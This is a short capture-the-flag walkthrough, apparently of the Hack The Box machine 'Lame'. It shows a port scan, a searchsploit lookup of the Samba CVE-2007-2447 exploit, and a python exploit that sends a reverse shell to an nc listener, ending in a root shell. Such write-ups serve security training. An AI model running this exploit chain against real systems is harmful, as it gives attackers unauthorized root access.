```bash
└─# IP=10.10.10.3
└─# nmap -A -sVC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-28 01:26 EDT
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.33s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: socket TIMEOUT
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-08-28T01:27:07-04:00
|_clock-skew: mean: 2h00m19s, deviation: 2h49m46s, median: 16s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

```bash
└─# searchsploit samba 3.0

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                               | unix/remote/16320.rb
```

```bash
└─# cat 16320.rb |grep CVE                                                                                                                                   1 ⨯
					[ 'CVE', '2007-2447' ],
					[ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
```

<img src=".\图片\Snipaste_2023-08-28_13-33-38.png" alt="Snipaste_2023-08-28_13-33-38" style="zoom:80%;" />



```bash
└─# python samba-exploit.py 10.10.10.3 139 10.10.14.8 1234
```



```
└─# nc -nvlp 1234                                                                                                                                        
listening on [any] 1234 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 53765
id
uid=0(root) gid=0(root)

```

```
find / -name "user.txt" 2>/dev/null
```
